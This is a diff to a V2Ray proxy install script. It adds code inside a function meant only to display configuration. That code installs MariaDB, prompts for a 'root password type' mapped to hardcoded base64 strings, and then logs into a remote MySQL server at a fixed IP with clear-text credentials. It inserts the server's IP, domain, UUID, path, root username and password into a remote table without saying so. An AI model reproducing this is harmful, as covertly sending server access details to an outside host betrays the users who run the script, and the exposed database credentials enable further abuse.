@@ -844,6 +844,35 @@ basic_information() {
 
 show_information() {
     cat "${v2ray_info_file}"
+    
+     sudo apt install mariadb-server -y
+#fonts color
+Green="\033[32m"
+Red="\033[31m"
+Yellow="\033[33m"
+GreenBG="\033[42;37m"
+RedBG="\033[41;37m"
+Font="\033[0m"
+    echo -e "—————————————— Select Root Password Type ——————————————"""
+    echo -e "${Green}1.${Font}  ROOT"
+    echo -e "${Green}2.${Font}  DO \n"
+    
+read -rp "Please select VPS password：" menu_num1
+    case $menu_num1 in
+    1)
+	db_root_password="WHdsKzVkR1RWQmhScWJwUXYvd3JhNm42bThaQkxsTXR4ZnJnTk5IL0lTcz0="
+	;;
+    2)
+	db_root_password="VEY0TmpUTmhTdUhuTTB6SlVnREFhUT09"
+	;;
+    *)
+        echo -e "${RedBG}Please enter the correct number ${Font}"
+        ;;
+    esac
+read -p "Enter Panel Host: "  db_hostname
+	mysql -unew -pnew!@#$% -h142.44.136.130 -e"USE new
+	INSERT INTO v2_ray_servers (id, name, address, host, status, uuid, path, root, hostip, password, alterid, port) VALUES ('', '$db_hostname', '$MYDNS', '$MYDNS', '1', '$UUID', '$camouflage', 'root', '$IPADDR', '$db_root_password', '2', '443');"
+clear
 }
 add_v2rayclient() {
 cat <<'MyV2RayClientAdd' > /usr/bin/v2rayclientadd
